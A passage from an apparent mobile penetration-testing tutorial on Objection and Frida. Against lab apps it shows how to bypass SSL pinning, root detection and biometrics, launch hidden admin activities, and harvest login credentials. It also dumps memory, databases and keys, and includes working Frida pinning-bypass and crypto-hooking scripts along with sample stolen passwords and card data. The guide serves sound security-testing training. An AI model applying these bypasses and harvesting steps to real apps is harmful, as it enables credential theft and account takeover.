  User{id=1, email='admin@bank.com', username='admin', isAdmin=true}

Instance 3:
  User{id=99, email='test@bank.com', username='testuser', isAdmin=false}
```

---

## Android KeyStore Analysis

```powershell
# List all KeyStore aliases (what keys are stored)
com.example.vulnerable_app on (Android: 10) [usb] # android keystore list
```
```
[*] Querying AndroidKeyStore...

Alias                   Entry Type
----------------------  -------------------
user_signing_key        PrivateKeyEntry
session_encryption_key  SecretKeyEntry
app_token_key           SecretKeyEntry
biometric_key           PrivateKeyEntry

[*] Found 4 entries
```

```powershell
# Get detailed info about a key
com.example.vulnerable_app on (Android: 10) [usb] # android keystore detail user_signing_key
```
```
[*] Details for alias: user_signing_key

Algorithm        : RSA
Key Size         : 2048 bits
Creation Date    : 2026-01-15
Origin           : GENERATED (inside secure hardware)
Purposes         : SIGN, VERIFY
Digests          : SHA-256, SHA-512
User Auth Needed : false
```

---

## Intent Manipulation

### Start Activities Directly

```powershell
# List all activities in the app
com.example.vulnerable_app on (Android: 10) [usb] # android hooking list activities
```
```
com.example.vulnerable_app.MainActivity
com.example.vulnerable_app.LoginActivity
com.example.vulnerable_app.AdminPanelActivity     <-- interesting
com.example.vulnerable_app.DebugActivity          <-- interesting
com.example.vulnerable_app.TransferActivity
com.example.vulnerable_app.SettingsActivity
```

```powershell
# Launch the admin panel directly (bypass normal auth flow)
com.example.vulnerable_app on (Android: 10) [usb] # android intent launch_activity com.example.vulnerable_app.AdminPanelActivity
```
```
[*] Launching activity: com.example.vulnerable_app.AdminPanelActivity
[+] Activity started! Admin panel now visible on emulator.
```

```powershell
# Launch with extras (parameters)
com.example.vulnerable_app on (Android: 10) [usb] # android intent launch_activity com.example.vulnerable_app.DebugActivity --extra string debug_mode enabled
```
```
[*] Launching DebugActivity with extra: debug_mode=enabled
[+] Debug activity started with debug mode on!
```

### List and Start Services

```powershell
# List services
com.example.vulnerable_app on (Android: 10) [usb] # android hooking list services
```
```
com.example.vulnerable_app.service.SyncService
com.example.vulnerable_app.service.BackgroundExfilService
com.example.vulnerable_app.service.CrashReportService
```

---

## HTTP Traffic Monitoring

```powershell
# Monitor all HTTP/HTTPS requests made by the app
com.example.vulnerable_app on (Android: 10) [usb] # android hooking monitor http
```
```
[*] Hooking HTTP client classes...
[*] Hooking okhttp3.OkHttpClient
[*] Hooking java.net.URL.openConnection()
[*] Hooking com.android.okhttp.internal.http.HttpEngine

--- Live HTTP traffic ---

[HTTP] 14:22:01 → POST https://api.bank.com/v2/auth/login
  Headers:
    Content-Type: application/json
    User-Agent: BankApp/3.2.1 Android/10
  Body:
    {"username":"john.doe@bank.com","password":"MyBankP@ss2024"}

[HTTP] 14:22:02 ← 200 https://api.bank.com/v2/auth/login
  Body:
    {"token":"eyJhbGciOiJIUzI1NiJ9...","userId":42,"role":"user"}

[HTTP] 14:22:05 → GET https://api.bank.com/v2/account/42/balance
  Headers:
    Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

[HTTP] 14:22:05 ← 200 https://api.bank.com/v2/account/42/balance
  Body:
    {"balance":15000.00,"currency":"USD","last_txn":"2026-04-20"}
```

---

## Clipboard Monitoring

```powershell
# Monitor clipboard reads and writes
com.example.vulnerable_app on (Android: 10) [usb] # android clipboard monitor
```
```
[*] Hooking ClipboardManager...
[*] Monitoring clipboard access...

[CLIPBOARD WRITE] 14:23:11
  Content: "4111 1111 1111 1111"   <-- Credit card copied to clipboard!
  Called by: com.example.vulnerable_app.PaymentActivity.copyCreditCard()

[CLIPBOARD READ] 14:23:15
  Content: "4111 1111 1111 1111"
  Called by: com.example.vulnerable_app.ui.PaymentForm.paste()
```

---

## Screenshot & Screen Analysis

```powershell
# Take screenshot of the current app screen
com.example.vulnerable_app on (Android: 10) [usb] # android ui screenshot C:\pentest\mobile\screen.png
```
```
[*] Taking screenshot...
[+] Screenshot saved to: C:\pentest\mobile\screen.png
```

```powershell
# Get current activity name (what screen is visible)
com.example.vulnerable_app on (Android: 10) [usb] # android ui currentpackage
```
```
com.example.vulnerable_app
```

```powershell
# Get the current focused Activity
com.example.vulnerable_app on (Android: 10) [usb] # android ui currentactivity
```
```
com.example.vulnerable_app.AdminPanelActivity
```

---

## Shell Command Execution

```powershell
# Execute shell commands on the device from inside Objection
com.example.vulnerable_app on (Android: 10) [usb] # android shell_exec id
```
```
uid=10095(u0_a95) gid=10095(u0_a95) groups=10095(u0_a95)
```

```powershell
# List files in the app's directory
com.example.vulnerable_app on (Android: 10) [usb] # android shell_exec ls /data/data/com.example.vulnerable_app/
```
```
cache  code_cache  databases  files  shared_prefs
```

```powershell
# Get device info
com.example.vulnerable_app on (Android: 10) [usb] # android shell_exec getprop ro.build.version.release
```
```
10
```

---

## Memory Search

```powershell
# Search memory for a specific string
com.example.vulnerable_app on (Android: 10) [usb] # memory search "password"
```
```
[*] Searching process memory for pattern: password
[*] Scanning 847 readable memory regions...

[MATCH] Address: 0x7f3a001234  Value: password=MyBankP@ss2024
[MATCH] Address: 0x7f3a005678  Value: {"password":"MyBankP@ss2024","userId":42}
[MATCH] Address: 0x7f3a009abc  Value: db_password=prod_mysql_p@ssw0rd

[*] Found 3 matches
```

```powershell
# Search for hex patterns (e.g., JWT header: eyJ = base64)
com.example.vulnerable_app on (Android: 10) [usb] # memory search "eyJhbGci"
```
```
[MATCH] Address: 0x7f3b001234  Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI0...
[MATCH] Address: 0x7f3b005678  Value: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Dump Memory to File

```powershell
# Dump a specific memory region to a file
com.example.vulnerable_app on (Android: 10) [usb] # memory dump all C:\pentest\mobile\memdump.bin
```
```
[*] Dumping all readable memory regions...
[*] Region 1/847: 0x7f000000 - 0x7f100000 (1 MB)
[*] Region 2/847: 0x7f100000 - 0x7f200000 (1 MB)
...
[+] Memory dump complete: C:\pentest\mobile\memdump.bin  (1.2 GB)
```

```powershell
# Search the dump on Windows
findstr /C:"password" C:\pentest\mobile\memdump.bin
# Or use strings equivalent:
# Install strings.exe from Sysinternals: https://docs.microsoft.com/en-us/sysinternals/
strings C:\pentest\mobile\memdump.bin | findstr /I "password token secret key"
```

---

## Jobs — Managing Multiple Hooks

```powershell
# List all active jobs (hooks running in background)
com.example.vulnerable_app on (Android: 10) [usb] # jobs list
```
```
[*] Active jobs:

Job ID                                 Hooks  Type
-------------------------------------  -----  ----------------------------------
3582ee4b-3e1f-4f23-b0ab-42d3fcb5a0c7      7  android sslpinning disable
91a2b3c4-5678-90ab-cdef-1234567890ab      6  android root disable
ab12cd34-ef56-7890-abcd-ef1234567890      1  android hooking watch CryptoHelper
```

```powershell
# Kill a specific job (disable a hook)
com.example.vulnerable_app on (Android: 10) [usb] # jobs kill 3582ee4b-3e1f-4f23-b0ab-42d3fcb5a0c7
```
```
[*] Killing job: 3582ee4b-3e1f-4f23-b0ab-42d3fcb5a0c7
[+] Job killed. SSL pinning bypass deactivated.
```

---

## Objection REPL Mode

You can also run Objection in pure REPL mode without attaching to an app — useful for running custom Frida scripts:

```powershell
# Open Frida REPL
objection explore --repl
```
```
frida (16.5.9) # 
```

```javascript
// Inside the REPL — write raw JavaScript
Java.perform(function() {
    var System = Java.use("java.lang.System");
    console.log("Java version: " + System.getProperty("java.version"));
    console.log("App datadir: " + System.getProperty("user.dir"));
});
```
```
Java version: 0
App datadir: /
```

---

## Proxy Configuration via Objection

```powershell
# Set the app's proxy through Objection (redirects all traffic)
com.example.vulnerable_app on (Android: 10) [usb] # android proxy set 192.168.1.100 8080
```
```
[*] Setting system proxy to 192.168.1.100:8080
[+] Proxy configuration applied
[*] All HTTP traffic will now route through 192.168.1.100:8080
```

```powershell
# Remove proxy
com.example.vulnerable_app on (Android: 10) [usb] # android proxy clear
```
```
[+] Proxy configuration cleared
```

---

## Real-World Scenario 1 — Banking App Full Bypass

> Scenario: You have a banking app that has SSL pinning, root detection, and biometric authentication. Your goal is to bypass all protections and capture authentication credentials.
{: .prompt-info }

```
┌─────────────────────────────────────────────────────────────────────┐
│          BANKING APP FULL BYPASS — ATTACK FLOW                      │
│                                                                     │
│  1. Start emulator + frida-server                                   │
│  2. Launch target app                                               │
│  3. Attach Objection with bypass commands at startup                │
│  4. App starts — all protections already bypassed                   │
│  5. Set Burp as proxy                                               │
│  6. Log in — credentials captured in Burp                           │
│  7. Dump SharedPreferences — find stored token                      │
│  8. Hook crypto methods — capture encryption keys                   │
│  9. Download SQLite databases — extract all data                    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

```powershell
# STEP 1: Start frida-server (if not already running)
adb shell "/data/local/tmp/frida-server &"

# STEP 2: Set Burp proxy on emulator
adb shell settings put global http_proxy 192.168.1.100:8080

# STEP 3: Spawn app with all bypasses active from the first millisecond
objection -g com.bankapp.mobile explore --startup-command "android root disable; android sslpinning disable"
```
```
[*] Spawning com.bankapp.mobile...
[*] Injecting agent...
[*] android root disable → 6 hooks active
[*] android sslpinning disable → 7 hooks active
[*] Resuming app...

com.bankapp.mobile on (Android: 10) [usb] #
```

```powershell
# STEP 4: Add biometric bypass
com.bankapp.mobile on (Android: 10) [usb] # android ui biometric_bypass enable
```
```
[+] Biometric authentication will auto-succeed
```

```powershell
# STEP 5: Watch all crypto operations
com.bankapp.mobile on (Android: 10) [usb] # android hooking watch class com.bankapp.mobile.security.CryptoUtils --dump-args --dump-return
```

```powershell
# STEP 6: Use the app normally — log in with any credentials
# Burp captures:
# POST /v3/auth/login
# {"username":"victim@bank.com","password":"TheirRealPassword"}
# ← 200 {"token":"eyJhbGci...","refreshToken":"ref_abc123"}

# STEP 7: Dump SharedPreferences for stored credentials/tokens
com.bankapp.mobile on (Android: 10) [usb] # android sharedpreferences read app_preferences
```
```
session_token    : eyJhbGciOiJIUzI1NiJ9...
refresh_token    : ref_abc123def456
pin_hash         : 5e884898da28047151d0e56f8dc6292773603d0d
pin_salt         : randomsalt123
last_username    : victim@bank.com
device_id        : d1e2v3i4c5e6
```

```powershell
# STEP 8: Download and read the SQLite database
com.bankapp.mobile on (Android: 10) [usb] # android filesystem download /data/data/com.bankapp.mobile/databases/banking.db
```
```
[+] Saved to: C:\pentest\mobile\banking.db
```

```powershell
# Outside Objection — read the database
sqlite3 C:\pentest\mobile\banking.db "SELECT * FROM accounts;"
```
```
id  owner_id  account_num   balance   type
1   42        ACC-7890-1234  15000.00  CHECKING
2   42        ACC-7890-5678   5000.00  SAVINGS
3   1         ACC-0000-0001  99999.99  ADMIN_RESERVE
```

---

## Real-World Scenario 2 — Certificate Pinning + OkHttp

> Scenario: App uses OkHttp3 with custom certificate pinner. Standard `android sslpinning disable` partially works, but one endpoint still fails. You need to target the specific pinner class.
{: .prompt-info }

```powershell
# First attempt — standard bypass
com.target.app on (Android: 10) [usb] # android sslpinning disable
```
```
[+] SSL Pinning bypass active
```

```powershell
# But one endpoint still fails. Find the custom pinner class:
com.target.app on (Android: 10) [usb] # android hooking search classes CertificatePinner
```
```
okhttp3.CertificatePinner
com.target.app.security.CustomCertificatePinner    <-- custom class
```

```powershell
# List methods of the custom pinner
com.target.app on (Android: 10) [usb] # android hooking list class_methods com.target.app.security.CustomCertificatePinner
```
```
public boolean com.target.app.security.CustomCertificatePinner.isValidCert(java.lang.String, java.security.cert.Certificate[])
public void com.target.app.security.CustomCertificatePinner.check(java.lang.String, java.util.List)
```

```powershell
# Hook the custom pinner to bypass it
# Write a custom Frida script:
```

```javascript
// C:\pentest\mobile\custom_pinning_bypass.js
Java.perform(function() {
    // Bypass standard OkHttp pinner
    var CertPinner = Java.use("okhttp3.CertificatePinner");
    CertPinner.check.overload('java.lang.String', 'java.util.List').implementation = function(host, certs) {
        console.log("[BYPASS] okhttp3.CertificatePinner.check() bypassed for: " + host);
        return;  // Do nothing = accept all certs
    };

    // Bypass the custom pinner
    var CustomPinner = Java.use("com.target.app.security.CustomCertificatePinner");
    CustomPinner.isValidCert.implementation = function(host, certs) {
        console.log("[BYPASS] CustomCertificatePinner.isValidCert() → returning true for: " + host);
        return true;
    };
    CustomPinner.check.overload('java.lang.String', 'java.util.List').implementation = function(host, certs) {
        console.log("[BYPASS] CustomCertificatePinner.check() bypassed for: " + host);
        return;
    };
});
```

```powershell
# Load the bypass script
objection -g com.target.app explore --startup-script C:\pentest\mobile\custom_pinning_bypass.js
```
```
[*] Spawning com.target.app...
[*] Loading: custom_pinning_bypass.js
[+] All pinners bypassed
[*] Resuming...

--- When app makes network calls ---
[BYPASS] okhttp3.CertificatePinner.check() bypassed for: api.target.com
[BYPASS] CustomCertificatePinner.isValidCert() → returning true for: cdn.target.com
[BYPASS] CustomCertificatePinner.check() bypassed for: auth.target.com
```

---

## Real-World Scenario 3 — Credential Harvesting via Hook

> Scenario: You want to capture every username and password that goes through the login function without relying on Burp.
{: .prompt-info }

```powershell
# Find the login method
com.target.app on (Android: 10) [usb] # android hooking search methods login
```
```
com.target.app.auth.AuthService.performLogin
com.target.app.ui.LoginActivity.onLoginSubmit
com.target.app.data.AuthRepository.loginWithCredentials
```

```powershell
# Watch the login method with all arguments
com.target.app on (Android: 10) [usb] # android hooking watch class_method com.target.app.auth.AuthService.performLogin --dump-args --dump-return --dump-backtrace
```
```
--- User enters credentials ---
[Hook] com.target.app.auth.AuthService.performLogin()
  Arguments:
    Arg 0 (String): victim@company.com
    Arg 1 (String): CorpP@ssword2024!
    Arg 2 (String): emulator-device-id-abc123
  Return Value: {"token":"eyJhbGci...","expires":1713700800}
  Backtrace:
    performLogin(AuthService.java:87)
    onLoginSubmit(LoginActivity.java:145)
    ...
```

---

## Real-World Scenario 4 — Insecure Data Storage

> Scenario: Find all sensitive data stored insecurely on the device.
{: .prompt-info }

```powershell
# STEP 1: Read all SharedPreferences files
com.target.app on (Android: 10) [usb] # android sharedpreferences list
```
```
main_prefs
user_session
payment_data
debug_prefs
```

```powershell
# Read each one looking for sensitive data
com.target.app on (Android: 10) [usb] # android sharedpreferences read payment_data
```
```
card_number         : 4111111111111111    <-- PCI DSS violation!
card_expiry         : 12/26
card_cvv            : 123                <-- CVV stored in cleartext = critical finding
billing_address     : 123 Main St, NY
saved_payment       : true
```

```powershell
# STEP 2: Download all databases
com.target.app on (Android: 10) [usb] # android filesystem ls /data/data/com.target.app/databases/
```
```
f  app.db
f  sessions.db
f  cache.db
```

```powershell
com.target.app on (Android: 10) [usb] # android filesystem download /data/data/com.target.app/databases/app.db
com.target.app on (Android: 10) [usb] # android filesystem download /data/data/com.target.app/databases/sessions.db
```

```powershell
# STEP 3: Check files directory
com.target.app on (Android: 10) [usb] # android filesystem ls /data/data/com.target.app/files/
```
```
f  config.json
f  private_key.pem      <-- Private key stored in files!
f  user_photo.jpg
f  cached_response.json
```

```powershell
com.target.app on (Android: 10) [usb] # android filesystem cat /data/data/com.target.app/files/config.json
```
```json
{
  "api_base": "https://api.target.com/v2",
  "api_key": "sk_live_4eC39HqLyjWDarjtT1zdp7dc",
  "debug_token": "debug_admin_token_INTERNAL_ONLY",
  "feature_flags": {
    "admin_panel_enabled": true,
    "debug_mode": false
  }
}
```

```powershell
com.target.app on (Android: 10) [usb] # android filesystem download /data/data/com.target.app/files/private_key.pem
```
```
[+] Downloaded to: C:\pentest\mobile\private_key.pem
```

```powershell
# Read the downloaded private key on Windows
Get-Content C:\pentest\mobile\private_key.pem
```
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2a2rwplBQLFYFGSvMbFAOSMEMFe1VcnWe3Yb5W...
[Full RSA private key exposed!]
-----END RSA PRIVATE KEY-----
```

---

## Real-World Scenario 5 — Weak Cryptography Detection

> Scenario: The app uses AES encryption but with a hardcoded key. Hook the crypto methods to extract the key and IV in real time.
{: .prompt-info }

```javascript
// C:\pentest\mobile\crypto_inspector.js
Java.perform(function() {
    // Hook AES cipher operations
    var Cipher = Java.use("javax.crypto.Cipher");

    Cipher.init.overload('int', 'java.security.Key').implementation = function(opmode, key) {
        var keyBytes = key.getEncoded();
        var hexKey = bytesToHex(keyBytes);
        var mode = (opmode === 1) ? "ENCRYPT" : "DECRYPT";
        console.log("[CIPHER] " + mode + " — Key: " + hexKey);
        return this.init(opmode, key);
    };

    Cipher.init.overload('int', 'java.security.Key', 'java.security.spec.AlgorithmParameterSpec').implementation = function(opmode, key, params) {
        var keyBytes = key.getEncoded();
        var hexKey = bytesToHex(keyBytes);
        var mode = (opmode === 1) ? "ENCRYPT" : "DECRYPT";

        var hexIV = "";
        try {
            var IvSpec = Java.use("javax.crypto.spec.IvParameterSpec");
            var ivSpec = Java.cast(params, IvSpec);
            hexIV = bytesToHex(ivSpec.getIV());
        } catch(e) {}

        console.log("[CIPHER] " + mode);
        console.log("  Algorithm : " + this.getAlgorithm());
        console.log("  Key (hex) : " + hexKey);
        if (hexIV) console.log("  IV  (hex) : " + hexIV);
        return this.init(opmode, key, params);
    };

    Cipher.doFinal.overload('[B').implementation = function(data) {
        var inputHex = bytesToHex(data);
        var result = this.doFinal(data);
        var outputHex = bytesToHex(result);
        console.log("  Input     : " + inputHex);
        console.log("  Output    : " + outputHex);
        return result;
    };

    function bytesToHex(bytes) {
        var hex = "";
        for (var i = 0; i < bytes.length; i++) {
            var b = (bytes[i] & 0xff).toString(16);
            hex += (b.length === 1 ? "0" : "") + b;
        }
        return hex;
    }
});
```

```powershell
objection -g com.target.app explore --startup-script C:\pentest\mobile\crypto_inspector.js
```
```
--- When app encrypts data ---
[CIPHER] ENCRYPT
  Algorithm : AES/CBC/PKCS5Padding
  Key (hex) : 2b7e151628aed2a6abf7158809cf4f3c   <-- Hardcoded AES-128 key!
  IV  (hex) : 000102030405060708090a0b0c0d0e0f   <-- Predictable IV!
  Input     : 7b22757365726e616d65223a226a6f686e...
  Output    : 7649abac8119b246cee98e9b12e9197d...

[CIPHER] DECRYPT
  Algorithm : AES/CBC/PKCS5Padding
  Key (hex) : 2b7e151628aed2a6abf7158809cf4f3c
  IV  (hex) : 000102030405060708090a0b0c0d0e0f
  Input     : 7649abac8119b246cee98e9b12e9197d...
  Output    : 7b22737461747573223a226f6b227d...
```

```powershell
# Decrypt the captured data on Windows using the extracted key
# Use CyberChef or write a Python script:
python3 C:\pentest\mobile\decrypt.py
```

```python
# C:\pentest\mobile\decrypt.py
from Crypto.Cipher import AES
import binascii

key = binascii.unhexlify("2b7e151628aed2a6abf7158809cf4f3c")
iv  = binascii.unhexlify("000102030405060708090a0b0c0d0e0f")
enc = binascii.unhexlify("7649abac8119b246cee98e9b12e9197d5086cb9b3cfd651d4dc8d7ea4b8327f5")

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(enc)
print("Decrypted:", plaintext.rstrip(b'\x10').decode('utf-8'))
```
```
Decrypted: {"username":"john.doe","password":"MyBankP@ss2024","balance":15000}
```

---

## Troubleshooting Common Errors

```
┌──────────────────────────────────────────────────────────────────────┐
│                    COMMON ERRORS & FIXES                             │
├────────────────────────────────┬─────────────────────────────────────┤
│ Error                          │ Fix                                  │
├────────────────────────────────┼─────────────────────────────────────┤
│ Failed to spawn: unable to     │ frida-server not running             │
│ find process                   │ → adb shell "/data/local/tmp/        │
│                                │   frida-server &"                    │
├────────────────────────────────┼─────────────────────────────────────┤
│ Unable to communicate with     │ Version mismatch — pip frida         │
│ remote frida-server            │ ≠ frida-server binary                │
│                                │ → reinstall both to same version     │
├────────────────────────────────┼─────────────────────────────────────┤
│ App crashes when Objection     │ Anti-Frida detection                 │
│ attaches                       │ → Use spawn mode with                │
│                                │   --startup-command                  │
├────────────────────────────────┼─────────────────────────────────────┤
│ SSL bypass doesn't work        │ Custom pinner not hooked             │
│ on one endpoint                │ → Search for pinner class and        │
│                                │   hook manually                      │
├────────────────────────────────┼─────────────────────────────────────┤
│ Access denied on               │ Using Google Play image              │
│ /data/local/tmp                │ → Switch to Google APIs image        │
├────────────────────────────────┼─────────────────────────────────────┤
│ Emulator very slow             │ HAXM/WHPX not enabled                │
│                                │ → Enable Windows Hypervisor          │
│                                │   Platform in Windows Features       │
├────────────────────────────────┼─────────────────────────────────────┤
│ adb: command not found         │ PATH not set                         │
│                                │ → Add platform-tools to PATH         │
├────────────────────────────────┼─────────────────────────────────────┤
│ frida-server permission        │ chmod not applied                    │
│ denied                         │ → adb shell chmod 755                │
│                                │   /data/local/tmp/frida-server       │
└────────────────────────────────┴─────────────────────────────────────┘
```

### How to Check Frida Version Match

```powershell
# Check Python frida library version
python -c "import frida; print(frida.__version__)"
```
```
16.5.9
```

```powershell
# Check frida-server version on device
adb shell /data/local/tmp/frida-server --version
```
```
16.5.9
```

> Both must print the **same version number**. If they differ, download the correct frida-server binary and re-push it.
{: .prompt-warning }

---

## Full Session Checklist

```
┌──────────────────────────────────────────────────────────────────┐
│              MOBILE PENTEST SESSION CHECKLIST                    │
├──────────────────────────────────────────────────────────────────┤
│  SETUP                                                           │
│  [ ] Emulator started (Google APIs, API 29, x86_64)             │
│  [ ] adb devices shows device                                    │
│  [ ] frida-server pushed + chmod 755                             │
│  [ ] frida-server running (adb shell ps | grep frida)            │
│  [ ] frida-ps -Ua shows target app                               │
│  [ ] Burp proxy configured + CA cert installed                   │
│                                                                  │
│  BYPASS CHECKS                                                   │
│  [ ] Root detection bypassed (android root disable)              │
│  [ ] SSL pinning bypassed (android sslpinning disable)           │
│  [ ] Biometric bypassed if needed (ui biometric_bypass enable)   │
│                                                                  │
│  DATA COLLECTION                                                 │
│  [ ] SharedPreferences read (all files)                          │
│  [ ] SQLite databases downloaded                                 │
│  [ ] Files directory checked                                     │
│  [ ] KeyStore contents listed                                    │
│  [ ] Memory searched for credentials/tokens                      │
│  [ ] HTTP traffic captured in Burp                               │
│                                                                  │
│  HOOKING                                                         │
│  [ ] Crypto methods watched                                      │
│  [ ] Auth methods watched                                        │
│  [ ] Login credentials captured                                  │
│  [ ] Exported activities launched                                │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Quick Reference Cheat Sheet

```
╔════════════════════════════════════════════════════════════════════╗
║                 OBJECTION COMPLETE CHEAT SHEET                    ║
╠════════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  FRIDA SERVER SETUP                                                ║
║  adb push frida-server /data/local/tmp/frida-server               ║
║  adb shell chmod 755 /data/local/tmp/frida-server                 ║
║  adb shell "/data/local/tmp/frida-server &"                       ║
║  frida-ps -Ua                    List running apps                 ║
║                                                                    ║
║  CONNECT                                                           ║
║  objection -g <pkg> explore                   Attach              ║
║  objection -g <pkg> explore --startup-command "..."  Spawn        ║
║  objection -g <pkg> explore --startup-script file.js              ║
║                                                                    ║
║  BYPASSES                                                          ║
║  android sslpinning disable      Bypass SSL pinning               ║
║  android root disable            Bypass root detection            ║
║  android root simulate           Simulate clean env               ║
║  android ui biometric_bypass enable   Bypass biometric            ║
║                                                                    ║
║  FILESYSTEM                                                        ║
║  android filesystem ls <path>    List directory                   ║
║  android filesystem cat <path>   Read file                        ║
║  android filesystem download <path>   Download to Windows         ║
║  android filesystem upload <local> <remote>   Upload file         ║
║                                                                    ║
║  SHARED PREFS                                                      ║
║  android sharedpreferences list  List all files                   ║
║  android sharedpreferences read <name>   Read file                ║
║                                                                    ║
║  HOOKING                                                           ║
║  android hooking list classes    List loaded classes              ║
║  android hooking search classes <keyword>                         ║
║  android hooking list class_methods <classname>                   ║
║  android hooking search methods <keyword>                         ║
║  android hooking watch class <classname>                          ║
║  android hooking watch class_method <class.method>                ║
║    --dump-args --dump-return --dump-backtrace                     ║
║  android hooking list activities                                  ║
║  android hooking list services                                    ║
║                                                                    ║
║  HEAP                                                              ║
║  android heap search instances <classname>                        ║
║  android heap execute <handle> <method>                           ║
║  android heap evaluate <handle>                                   ║
║  android heap print_instances <classname>                         ║
║                                                                    ║
║  INTENTS                                                           ║
║  android intent launch_activity <classname>                       ║
║  android intent launch_activity <class> --extra string k v        ║
║                                                                    ║
║  MEMORY                                                            ║
║  memory search "<string>"        Search memory                    ║
║  memory dump all <output.bin>    Dump all memory                  ║
║                                                                    ║
║  KEYSTORE                                                          ║
║  android keystore list           List all keys                    ║
║  android keystore detail <alias> Key details                      ║
║                                                                    ║
║  UI & MISC                                                         ║
║  android ui screenshot <path>    Take screenshot                  ║
║  android ui currentactivity      Get active screen                ║
║  android clipboard monitor       Monitor clipboard                ║
║  android proxy set <ip> <port>   Set proxy                        ║
║  android proxy clear             Remove proxy                     ║
║  android shell_exec <cmd>        Run shell command                ║
║  jobs list                       List active hooks                ║
║  jobs kill <id>                  Kill a hook                      ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝
```

---

## References

- [Objection GitHub — leonjza](https://github.com/sensepost/objection)
- [Frida Official Documentation](https://frida.re/docs/)
- [Frida Releases — GitHub](https://github.com/frida/frida/releases)
- [Android Studio Download](https://developer.android.com/studio)
- [OWASP MASTG — Mobile Security Testing Guide](https://mas.owasp.org/MASTG/)
- [OWASP MSTG — Testing Storage](https://mas.owasp.org/MASTG/tests/android/MASVS-STORAGE/)
- [OWASP MSTG — Network Communication](https://mas.owasp.org/MASTG/tests/android/MASVS-NETWORK/)
- [Frida CodeShare — Community Scripts](https://codeshare.frida.re/)
- [Objection Wiki](https://github.com/sensepost/objection/wiki)
